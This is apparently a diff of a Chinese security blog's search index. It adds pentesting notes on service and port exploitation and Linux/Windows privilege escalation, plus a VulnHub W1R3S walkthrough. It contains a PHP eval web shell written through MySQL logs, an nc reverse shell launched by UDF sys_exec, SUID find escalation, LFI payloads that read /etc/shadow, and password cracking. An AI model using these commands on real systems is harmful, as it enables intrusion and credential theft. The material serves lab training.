@@ -4,6 +4,85 @@
   
     
     <entry>
+      <title>服务和端口利用</title>
+      <link href="/article/server-and-ports/"/>
+      <url>/article/server-and-ports/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>服务和端口利用</h1><h2 id="ftp-21"><a class="header-anchor" href="#ftp-21">¶</a>ftp/21</h2><p>匿名登录, 用户名anonymous, 密码为空</p><p>一进入ftp就要切换为二进制模式, 可以避免下载的可执行文件损坏, 命令为<code>binary</code></p><p>如果要下载多个文件, 首先利用<code>prompt</code>关闭交互式的提示模式, 随后用<code>mget *.txt</code>一次下载当前位置所有的txt文件</p><h2 id="ssh-22"><a class="header-anchor" href="#ssh-22">¶</a>ssh/22</h2><h2 id="stmp-25-信息枚举"><a class="header-anchor" href="#stmp-25-信息枚举">¶</a>stmp/25 信息枚举</h2><p>工具: smtp-user-enum命令</p><h2 id="dns-53-信息泄露"><a class="header-anchor" href="#dns-53-信息泄露">¶</a>dns/53 信息泄露</h2><p>DNS域传送漏洞, 允许任意IP主机向DNS服务器请求同步信息, 就会出现该漏洞</p><p>该命令的解释为: 从10.10.10.10主机的DNS服务上请求与test.com有关的所有域名解析关系条目</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.10 axfr test.com</span><br></pre></td></tr></table></figure><h2 id="finger-79-信息泄露"><a class="header-anchor" href="#finger-79-信息泄露">¶</a>finger/79 信息泄露</h2><p>工具: finger命令</p><h2 id="pop3-110"><a class="header-anchor" href="#pop3-110">¶</a>pop3/110</h2><p>反正试过包含pop3日志达到getshell</p><h2 id="rpcbind-111-信息泄露"><a class="header-anchor" href="#rpcbind-111-信息泄露">¶</a>rpcbind/111 信息泄露</h2><p>简称rpc<code>rpcinfo -p 192.168.56.101</code></p><h2 id="smb-445"><a class="header-anchor" href="#smb-445">¶</a>smb/445</h2><p>永恒之蓝警告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104 </span><br><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.11.136/smbdata </span><br></pre></td></tr></table></figure><h2 id="nfs-2049"><a class="header-anchor" href="#nfs-2049">¶</a>nfs/2049</h2><p>nfs挂载 远程登录, 配合文件getshell/ssh毒化</p><p>NFS通常与 Kerberos 配对以实现强大的身份验证机制, 因为NFS本身仅根据用户的UID/GID对用户进行身份验证, 非常不安全</p><p>一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限; 此权限绑定到用户的用户ID; 如果共享相同用户ID的两个用户挂载相同的NFS文件系统, 可以修改彼此的文件</p><p>由于目标没有 Kerberos 设置, 因此只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可</p><p>但是没有目标中任何用户的UID或GID, 这意味着即使挂载了该共享, 无法访问NFS共享</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可挂载目录</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 挂载到本地</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br></pre></td></tr></table></figure><h2 id="mysql-3306"><a class="header-anchor" href="#mysql-3306">¶</a>mysql/3306</h2><h3 id="直接写入木马"><a class="header-anchor" href="#直接写入木马">¶</a>直接写入木马</h3><pre><code>要求: `secure_file_priv`变量非NULL, 用户拥有`root`权限, 知道当前网站的绝对路径</code></pre><h3 id="日志文件写马"><a class="header-anchor" href="#日志文件写马">¶</a>日志文件写马</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否满足第一条</span><br><span class="line">select @@secure_file_priv</span><br><span class="line">// 查看日志记录是否开启和查看路径</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">// 开启日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;; SHOW VARIABLES LIKE &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>利用方式(蚁剑连接即可):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">select &#x27;一句话木马&#x27; into dumpfile/outfile &#x27;绝对路径&#x27;</span><br><span class="line">// 第二种</span><br><span class="line">SET GLOBAL general_log_file=&#x27;C:/www/shell.php&#x27;</span><br><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="MySQL-UDF"><a class="header-anchor" href="#MySQL-UDF">¶</a>MySQL UDF</h3><p>UDF(User Defined Function, 用户自定义函数), 可以通过UDF在Mysql中调用一些其原来不具备的功能. 提权需要的条件如下:</p><p>MySQL版本大于5, 且存在<code>lib_mysqludf_sys</code>, 查看是否存在方式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line">select * from func;</span><br></pre></td></tr></table></figure><p>如果没有, 则需要手动添加(稍微复杂)</p><blockquote><p>手动添加需要MySQL是以root权限启动, 这样能执行的命令才是root权限, 而自带的这个没说, 遇到了再说吧</p></blockquote><p>拥有该函数后, 可以有这些提权方法</p><ol><li>构建SUID程序</li><li>创建反弹shell</li><li>添加用户到管理员组</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构建SUID程序, 常用find</span><br><span class="line">SELECT sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 反弹shell到192.168.1.2</span><br><span class="line">SELECT sys_exec(&#x27;/bin/nc.traditional -e /bin/sh 192.168.1.2 1234&#x27;)</span><br><span class="line"># robert用户组更改</span><br><span class="line">SELECT sys_exec(&#x27;usermod -a -G admin robert&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>提权</title>
+      <link href="/article/get-root/"/>
+      <url>/article/get-root/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Linux</h1><h2 id="已知的可用来suid提权的文件-命令"><a class="header-anchor" href="#已知的可用来suid提权的文件-命令">¶</a>已知的可用来suid提权的文件/命令</h2><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li></ul><h2 id="利用enumy64分析权限"><a class="header-anchor" href="#利用enumy64分析权限">¶</a>利用enumy64分析权限</h2><p>enumy64: 是一款linux后渗透提权枚举工具，是一个快速的可移植、可执行文件</p><p>先在攻击机上开启web服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure><p>然后利用wget让靶机从攻击机上下载这个文件, 给权限, 运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.10.1:10000/enumy64</span><br><span class="line">chmod 777 enumy64</span><br><span class="line">./enumy64</span><br></pre></td></tr></table></figure><p>然后我们就可以得到一些有用的信息</p><p>类似的提权辅助工具: Linux-Exploit-Suggester</p><h2 id="连接shell后可以干的事"><a class="header-anchor" href="#连接shell后可以干的事">¶</a>连接shell后可以干的事</h2><p>查看计划任务、备份文件、suid的文件、可写文件等，总之寻找有没有一些ssh登录的凭据或是可以利用的提权文件</p><h2 id="利用计划任务进行提权"><a class="header-anchor" href="#利用计划任务进行提权">¶</a>利用计划任务进行提权</h2><p>主要看是不是用root权限执行某个文件, 可以是sh, 也可以是别的, 只要能执行指令就是好文件. 利用方式就是塞一个反弹shell代码进去即可</p><h2 id="利用msfconsole的edit修改文件提权"><a class="header-anchor" href="#利用msfconsole的edit修改文件提权">¶</a>利用msfconsole的edit修改文件提权</h2><p>meterpreter 下有个 edit 命令, 类似于 vim/etc/passwd 文件的第二位 x , 是密码占位符, 密码其实是加密存储在 /etc/shadow 下的可以假设 x 位密码存在, 那么root 就会默认密码为 x 位,  就不会去读取 /etc/shadow. 可以利用edit来进行编辑</p><p>利用<code>openssl passwd -1</code>, 生成密码, 密码明文为admin</p><p>输入<code>edit /etc/passwd</code>进行编辑(不一定每个靶机都行), 将之前生成的密码添加到root后的x位置</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313100249500.png" alt="111"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;// py重开终端</span><br><span class="line">su root// 输入admin</span><br></pre></td></tr></table></figure><h2 id="motd提权"><a class="header-anchor" href="#motd提权">¶</a>motd提权</h2><h2 id="contrab提权"><a class="header-anchor" href="#contrab提权">¶</a>contrab提权</h2><h2 id="namp提权"><a class="header-anchor" href="#namp提权">¶</a>namp提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -interactive</span><br></pre></td></tr></table></figure><h2 id="find提权"><a class="header-anchor" href="#find提权">¶</a>find提权</h2><p>检查find命令是否有suid权限，有suid权限可进行提权操作</p><p>查看find位置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which find</span><br></pre></td></tr></table></figure><p>查看find权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -alh /usr/bin/find</span><br></pre></td></tr></table></figure><p>使用find命令查看拥有suid权限的文件, 这个常用来查找可能利用的文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>如果find命令没有suid权限，给find命令赋予suid权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s /usr/bin/find</span><br></pre></td></tr></table></figure><p>find拥有suid权限位，尝试以find命令执行whoami, 看看是否为管理员权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find `which find` -exec whoami \;</span><br></pre></td></tr></table></figure><p>使用find命令来提权</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p>似乎说, bash 经常是被限制的,在受限模式下运行,如果 bash 不行就多试试 sh</p><h2 id="利用sudoers文件提权"><a class="header-anchor" href="#利用sudoers文件提权">¶</a>利用sudoers文件提权</h2><p>该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围, 可能需要这个用户本来就有sudo权限用于打开一个编辑器来编辑该文件</p><blockquote><p>用<code>sudo -l</code>来查看权限</p></blockquote><p>在<code># User privilege specification</code>这个注释下对应的用户权限设定末尾增加<code>/bin/bash</code></p><h2 id="用过的脚本"><a class="header-anchor" href="#用过的脚本">¶</a>用过的脚本</h2><ol><li><code>40839.c</code>, <code>Linux Kernel 2.6.22&lt;3.9 - 'Dirty COW'</code> 这个利用/etc/passwd的方式利用, 比较稳定</li><li><code>44298</code>, <code>Linux Kernel &lt; 4.40-116(Ubuntu 16.04.4) - Local Privilege Escalation</code></li><li><code>45010</code></li></ol><h1>Windows</h1><p>安装了<code>KB2871997</code>补丁或者系统版本大于<code>windows server 2012</code>时, 系统的内存中就不再保存明文的密码, mimikatz失效</p><p>提权辅助工具: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>, 执行systeminfo获取信息之后可以扔给它</p><h2 id="win7"><a class="header-anchor" href="#win7">¶</a>win7</h2><h2 id="windows2003"><a class="header-anchor" href="#windows2003">¶</a>windows2003</h2><p>直接上巴西烤肉</p><table><thead><tr><th>补丁</th><th>对应漏洞</th></tr></thead><tbody><tr><td>KB2360937</td><td>Ms10-084</td></tr><tr><td>KB2478960</td><td>MS11-014</td></tr><tr><td>KB2507938</td><td>MS11-056</td></tr><tr><td>KB2566454</td><td>Ms11-062</td></tr><tr><td>KB2646524</td><td>MS12-003</td></tr><tr><td>KB2645640</td><td>Ms12-009</td></tr><tr><td>KB2641653</td><td>MS12-018</td></tr><tr><td>KB944653</td><td>MS07-067</td></tr></tbody></table><p>msf:</p><ul><li>exploit/windows/local/ms13_053_schlamperei</li><li>exploit/windows/local/ms13_081_track_popup_menu</li><li>MS16-032</li><li>ms17-010永恒之蓝</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>W1R3S-1.0.1</title>
+      <link href="/article/W1R3S-1.0.1/"/>
+      <url>/article/W1R3S-1.0.1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>W1R3S: 1.0.1</h1><hr><p>easyNo.12</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/w1r3s-101,220/">vulnhub靶场-W1R3S: 1.0.1</a></p><p>目标: They have asked you to gain root access and find the flag (located in /root directory).</p><p>提示: This is a vulnerable Ubuntu box.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.135</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.110.0/24</span><br><span class="line">nmap -sn 192.168.110.0/24</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><h3 id="21-ftp"><a class="header-anchor" href="#21-ftp">¶</a>21/ftp</h3><p>先看看ftp, 发现存在匿名登录. 上去将所有的txt文件都下载下来</p><p>分析文件, 有个md5值, 放到网上解出来是&quot;This is not a password&quot;, pass. 还有一个base64字符串, 试试解码, 发现也没用</p><p>然后是员工列表, 有经理, IT, web设计等. 结合职务猜测可能存在的权限和可能获得的数据</p><p>倒过来看最后一个, “我不认为这是获取root的方式”, 暗示ftp这个地方就是无用的, 那就拉倒了</p><h3 id="3306-mysql"><a class="header-anchor" href="#3306-mysql">¶</a>3306/mysql</h3><p>没有密码, 同时测试后发现不允许被登录, 暂时放弃</p><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80/http</h3><p>目录扫描, 发现存在wordpress和一个installation界面? 用于安装Cuppa CMS.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[08:05:48] 302 -    7KB - /administrator/</span><br><span class="line">[08:06:07] 301 -    0B  - /wordpress/</span><br><span class="line">[08:06:08] 200 -    1KB - /wordpress/wp-login.php</span><br></pre></td></tr></table></figure><p>发现访问wordpress后自动跳转<code>https://192.168.110.130/wordpress/</code>, 奇怪</p><p>尝试修改<code>/etc/host</code>文件, 使得localhost指向192.168.110.135(其实就是绑定域名). 然后失败了, 似乎kali不允许用户调整localhost指向非本机ip, 先放在一边</p><p>来看看Cuppa CMS这个安装界面, 我们没有数据库密码, 同时也不知道数据库有什么东西, 只能看看有什么了.</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250127211352.png" alt="image.png"></p><p>尝试安装, 但是他说管理员用户创建失败, 那这里也走不通</p><p>尝试搜索有没有可以利用的漏洞, 只有一条, 那就拿下来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">locate php/webapps/25971.txt</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/25971.txt ~/Desktop/working</span><br></pre></td></tr></table></figure><p>打开来看, 大概意思是在特定文件的22行有一段代码产生了文件包含的漏洞, 攻击这个可以利用这个去包含本地或远程的php文件, 或者读取非php文件</p><p>然后是给的一些示例, 比如获取<code>/etc/passwd</code>, 可以读取<code>Configuration.php</code>等等</p><p>先确认是否存在这个漏洞, 给的payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>结合靶机, 稍微修改一下payload. 原payload测试后是没有反应的, 猜测安装到的是<code>administrator</code>路径, 成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.110.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129142939.png" alt="image.png"></p><p>结合图片, 发现没有得到预期输出<code>/etc/passwd</code>. 这里有两个方法: 一个是模糊测试, 更换一些参数/传参方式尝试利用 / 绕过一些限制. 另一个是找到对应版本或临近版本的源码进行代码审计</p><p>这边选择了上网寻找cuppa cms的源码: <a href="https://github.com/CuppaCMS/CuppaCMS">github-CuppaCMS</a></p><blockquote><p>搜索过程中还找到例如Cuppa CMS v1.0的RCE<code>CVE-2022-37190</code>, SQL注入<code>CVE-2022-24266</code>, 我们找到的这个txt文件说是2013.6.4, 但是还找到一个本地文件包含<code>CVE-2022-25486</code></p></blockquote><p>根据txt给出的路径顺利找到文件, 发现原来的第22行编程的第77行的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&quot;../components/table_manager/fields/config/&quot;</span>.@<span class="variable">$cuppa</span>-&gt;<span class="title function_ invoke__">POST</span>(<span class="string">&quot;urlConfig&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显然没有过滤, 只不过是更换传参方式为POST, 所以这个肯定存在文件包含</p><p>尝试利用curl传参, 让我试试curl(当然还可以利用hackbar之类的直接传). 然后成功获取内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.110.135/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129143202.png" alt="image.png"></p><p>获取<code>/etc/shadow</code>, 然后利用john对密码哈希值进行爆破, 成功爆破两条</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.110.135/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将shadow中有哈希值的用户名储存然后交给john</span></span><br><span class="line">john shadow.txt</span><br><span class="line"><span class="comment"># w1r3s : computer</span></span><br><span class="line"><span class="comment"># www-data : www-data</span></span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>肯定是w1r3s账户的权限更高. ssh连接w1r3s, 成功登录</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.13.0-36-generic 内核比较难提权</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息 Ubuntu 16.04.3 LTS</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 有所有地方的sudo权限</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129145317.png" alt="image.png"></p><p>不知道为什么执行sudo会卡非常久, 下面的提权也一样</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>存在所有地方的sudo权限, 那就已经结束了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p>在<code>/root</code>目录下有<code>flag.txt</code>文件</p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>视频解析一定要看, 虽然长度为一个小时: <a href="https://www.bilibili.com/video/BV1mB4y1j7K6">「红队笔记」靶机精讲：W1R3S 1.0.1 - 渗透测试思路为王，细节多到即使对于纯萌新也能无感入圈</a></p><h3 id="22-ssh"><a class="header-anchor" href="#22-ssh">¶</a>22/ssh</h3><p>尝试直接爆破. 从<code>/etc/passwd</code>获取用户名之后, 构造字典或结合已有字典进行爆破</p><blockquote><p>也可以利用从ftp中获取的用户/网站名构造用户名字典. 思路为: 大小写, 可能有权限的用户, 一些可能的字符串等等</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.110.135</span><br></pre></td></tr></table></figure><p>跑肯定是成功的, 毕竟已经解出来过了</p><h3 id="关于搜索到的漏洞"><a class="header-anchor" href="#关于搜索到的漏洞">¶</a>关于搜索到的漏洞</h3><p><code>CVE-2022-37190</code>: 经过身份验证的用户可以从<code>/api/index.php</code>控制两个参数, 可惜我们没有登录</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/22">详细描述 </a></p><p><code>CVE-2022-24266</code>: 在<code>/administrator/components/table_manager/</code>中通过<code>order_by</code>参数发现一个 SQL时间盲注漏洞, 没试出来</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/17">详细描述</a></p><p><code>CVE-2022-25486</code>: 这个才是我们刚才用于本地文件包含的漏洞, 和发现的那个txt不同的点就是一个是GET一个是POST</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/25">详细描述</a></p><p>除了这个还想还有一个地方可以进行文件包含<code>/alerts/alertLightbox.php</code>, 经过测试同样是成功包含到<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;url=../../../../../../../../../../../etc/passwd&#x27;</span> http://192.168.110.135/administrator/alerts/alertLightbox.php</span><br></pre></td></tr></table></figure><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/24">详细描述</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> FTP </tag>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>反弹shell</title>
       <link href="/article/reverse-shell/"/>
       <url>/article/reverse-shell/</url>
@@ -354,6 +433,31 @@
     
     
     <entry>
+      <title>渗透的准备工作</title>
+      <link href="/article/how-to-prepare/"/>
+      <url>/article/how-to-prepare/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html">hacktricks</a></p><p><a href="https://www.exploit-db.com/">漏洞库</a></p><p>主要的工具一般下载kali基本齐全</p><h1>信息收集</h1><p>nmap</p><p>目录枚举, dirbuster, gobuster, dirsearch</p><p>kali自身拥有一些字典, 比如<code>/usr/share/wordlists/dirbuster/</code>下的文件, <code>/usr/share/wordlists/rockyou.txt.gz</code>等</p><h1>流量捕获/分析</h1><p>burpsuite</p><p>wireshark</p><h1>反弹shell</h1><p>利用ncat在端口上进行监听, 利用生成或者现成的反弹shell获得连接, 随后可能利用python获取一个交互shell</p><p>下面是一个获取pty交互式shell的方式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br></pre></td></tr></table></figure><h1>文件传输</h1><p>利用py开启一个简单的http服务, 让另一方利用wget下载即可(自定义端口)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br><span class="line">python3 -m http.server <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>或者双方都有ncat, 可以利用ncat传输</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 靶机: 将返回数据存储到reverse_shell.php</span></span><br><span class="line">nc 192.168.56.5 10000 &gt; reverse_shell.php</span><br><span class="line"><span class="comment"># kali: 端口被访问时提供reverse_shell.php的文件内容</span></span><br><span class="line">nc -lvnp 10000 &lt; reverse_shell.php</span><br></pre></td></tr></table></figure><h1>本地信息枚举</h1><p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a></p><p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</a></p><p><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><p>甚至还有MacPEAS</p><p><a href="https://github.com/DominicBreuker/pspy">pspy</a></p><h1>本地脆弱性</h1><p>了解有什么本地脆弱性, 才能更好的提权</p><h2 id="泄露的登录凭证"><a class="header-anchor" href="#泄露的登录凭证">¶</a>泄露的登录凭证</h2><p>用于横向移动甚至越权</p><h2 id="不安全的程序功能"><a class="header-anchor" href="#不安全的程序功能">¶</a>不安全的程序功能</h2><p>-h或-help并不是完整的帮助信息, 如果需要则使用man命令(manual的缩写). 此时如果部分程序有命令执行功能, 这就是一个可能的漏洞点</p><h2 id="sudo权限分配"><a class="header-anchor" href="#sudo权限分配">¶</a>sudo权限分配</h2><p>部分用户在特定目录有sudo权限, 或者访问控制没做好, 可以利用这个获取root/shell</p><h2 id="密码复用"><a class="header-anchor" href="#密码复用">¶</a>密码复用</h2><p>顾名思义, 可能部分服务/用户/程序用户密码都是一样的</p><h2 id="操作系统内核漏洞"><a class="header-anchor" href="#操作系统内核漏洞">¶</a>操作系统内核漏洞</h2><p>没有及时更新补丁/系统导致的, 这个一般放在最后因为可能会对系统造成影响</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MyFileServer-1</title>
       <link href="/article/MyFileServer-1/"/>
       <url>/article/MyFileServer-1/</url>
@@ -614,9 +718,9 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -629,6 +733,31 @@
             <tag> stmp利用 </tag>
             
             <tag> 端口转发 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows前置知识</title>
+      <link href="/article/windows-uneedtoknow/"/>
+      <url>/article/windows-uneedtoknow/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Windows前置知识</h1><hr><h2 id="敏感文件"><a class="header-anchor" href="#敏感文件">¶</a>敏感文件</h2><ol><li><code>C:\Windows\System32\config\SAM</code></li></ol><p>该文件是存储加密过的系统帐号的密码文件, 可以利用工具获取, 比如lc5, 彩虹表, PwDum7.exe</p><ol start="2"><li><code>C:\Windows\System32\drivers\etc\hosts</code></li></ol><p>如果在hosts文件中增加域名解析记录, 则它会优先ping本地hosts文件中的记录; 如果你的hosts文件被污染, 就是DNS欺骗或钓鱼网站</p><ol start="3"><li><code>C:\Program files或Program files（x86）</code></li></ol><p>程序默认安装到的目录</p><ol start="4"><li><code>C:\Perflogs</code></li></ol><p>Windows系统的日志信息</p><ol start="5"><li><code>C:\ProgramData</code></li></ol><p>C盘的一个隐藏系统文件夹, 它是公用的被创建文件夹或文件存放的地方, 由创建者完整控制; 程序运行或启动生成的临时文件通常存放该目录, 电脑病毒也比较喜欢感染该目录</p><ol start="6"><li><code>C:\用户</code></li></ol><p>当我们提取某个服务器后, 通常会去查询该目录中存在的用户名, 该目录是信息深入收集所必须查找的目录, 包括桌面、我的文档等敏感信息或文件</p><p>比如qq, 如果没有修改默认文档储存位置, 就会在<code>用户名\文档\Tencent Files\qq号</code>处存在相关文件和信息</p><h2 id="注册表"><a class="header-anchor" href="#注册表">¶</a>注册表</h2><p><code>win+R</code>输入regedit即可打开注册表</p><ul><li><p><code>HKEY_CLASSES_ROOT</code></p><p>管理文件系统; 